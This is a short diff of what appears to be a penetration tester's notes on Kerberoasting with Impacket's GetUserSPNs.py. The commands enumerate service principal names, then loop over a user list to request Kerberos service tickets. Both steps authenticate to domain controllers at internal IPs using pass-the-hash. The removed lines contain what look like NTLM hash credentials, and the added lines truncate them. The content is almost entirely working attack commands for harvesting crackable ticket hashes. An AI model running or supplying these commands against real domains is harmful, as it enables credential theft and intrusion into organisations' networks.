@@ -1,13 +1,13 @@
 Request for tgs
 ```
- for i in $(cat kerb_n.txt); do python3 GetUserSPNs.py -target-domain  -request-user $i -outputfile hashes_$i.txt -hashes AAD3B435B51404EEAAD3B435B51404EE:2d6ae0b7ddfc2cac9477fe8554 -dc-ip 10.1.1.17 | tee -a hashes.txt; done
+ for i in $(cat kerb_n.txt); do python3 GetUserSPNs.py -target-domain  -request-user $i -outputfile hashes_$i.txt -hashes AAE:2 -dc-ip 10.1.1.17 | tee -a hashes.txt; done
 
 ```
 
 
 Get spn info
 ```
-python3 GetUserSPNs.py -target-domain n.ad.testinternal.com -request -outputfile kerb_n.txt -hashes AAD3B435B51404EEAAD3B435B51404EE:2d6ae0b7ddfc2cac9477f8554 -dc-ip 10.1.1.6 test-globalx.com/bhous
+python3 GetUserSPNs.py -target-domain ad.testinternal.com -request -outputfile kerb_n.txt -hashes A4EE:2 -dc-ip 10.1.1.6 test-globalx.com/bhous
 ```
 
 
